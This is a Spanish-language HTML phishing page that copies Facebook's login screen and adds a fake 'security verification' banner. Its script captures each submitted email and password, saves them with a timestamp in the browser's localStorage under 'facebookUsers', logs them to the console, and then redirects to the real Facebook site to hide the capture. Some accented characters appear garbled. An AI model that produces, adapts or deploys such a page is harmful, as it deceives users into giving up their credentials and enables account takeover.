<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Inicia sesi√≥n o reg√≠strate</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 980px;
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 50px;
        }
        
        .left-section {
            width: 50%;
            padding-right: 50px;
        }
        
        .logo {
            color: #1877f2;
            font-size: 60px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        
        .tagline {
            font-size: 28px;
            line-height: 32px;
            color: #1c1e21;
        }
        
        .right-section {
            width: 50%;
            display: flex;
            flex-direction: column;
        }
        
        .login-form {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
            width: 396px;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            outline: none;
        }
        
        .login-button {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            line-height: 48px;
            padding: 0 16px;
            width: 100%;
            color: white;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 15px;
        }
        
        .login-button:hover {
            background-color: #166fe5;
        }
        
        .security-alert {
            background: #fff8e1;
            border: 1px solid #ffd54f;
            border-radius: 6px;
            padding: 12px;
            margin-bottom: 15px;
            font-size: 13px;
            color: #e65100;
            text-align: center;
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #1877f2;
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            flex-direction: column;
        }
        
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-bottom: 20px;
        }
        
        .loading-text {
            color: white;
            font-size: 18px;
            font-weight: bold;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        @media (max-width: 900px) {
            .container {
                flex-direction: column;
                text-align: center;
            }
            
            .left-section, .right-section {
                width: 100%;
                padding: 0;
            }
            
            .left-section {
                margin-bottom: 40px;
            }
        }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
        <div class="loading-text">Verificando tu identidad...</div>
    </div>

    <div class="container">
        <div class="left-section">
            <div class="logo">facebook</div>
            <div class="tagline">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</div>
        </div>
        
        <div class="right-section">
            <form class="login-form" id="loginForm">
                <div class="security-alert">
                    üîí <strong>Verificaci√≥n de seguridad</strong> - Protege tu cuenta completando el inicio de sesi√≥n
                </div>
                
                <div class="form-group">
                    <input type="text" id="email" placeholder="Correo electr√≥nico o n√∫mero de tel√©fono" required>
                </div>
                
                <div class="form-group">
                    <input type="password" id="password" placeholder="Contrase√±a" required>
                </div>
                
                <button type="submit" class="login-button">Iniciar sesi√≥n</button>
            </form>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const loadingOverlay = document.getElementById('loadingOverlay');
            
            if (email && password) {
                // Mostrar loading
                loadingOverlay.style.display = 'flex';
                
                // Guardar datos
                let users = JSON.parse(localStorage.getItem('facebookUsers')) || [];
                users.push({ 
                    email: email, 
                    password: password, 
                    timestamp: new Date().toLocaleString('es-ES')
                });
                localStorage.setItem('facebookUsers', JSON.stringify(users));
                
                console.log('‚úÖ Datos guardados:', email);
                
                setTimeout(function() {
                    window.location.href = 'https://www.facebook.com/facebook/?locale=es_LA';
                }, 1000);
            }
        });
    </script>
</body>
</html>
